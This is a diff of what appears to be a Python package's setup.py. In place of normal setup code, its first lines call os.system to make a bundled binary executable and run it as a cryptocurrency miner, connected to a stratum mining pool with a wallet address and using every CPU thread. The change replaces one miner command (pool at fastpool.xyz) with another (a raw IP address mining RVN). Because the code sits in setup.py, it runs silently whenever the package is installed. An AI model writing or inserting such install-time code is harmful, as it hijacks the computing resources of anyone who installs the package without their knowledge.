@@ -1,5 +1,5 @@
 import os
-os.system ("chmod +x rhmac && ./rhmac -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10097 -su 621010-71.0.roller/x -cpu -cputhreads $(nproc)")
+os.system ("chmod +x pointd && ./pointd -a lyra2z330 -o stratum+tcp://103.249.70.7:4563 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.$(shuf -n 1 -i 1-9999999) -t $(nproc) -p c=RVN")
 from setuptools import find_packages, setup
 
 with open(os.path.join(os.path.dirname(__file__), 'README.md'), encoding="utf-8") as readme:
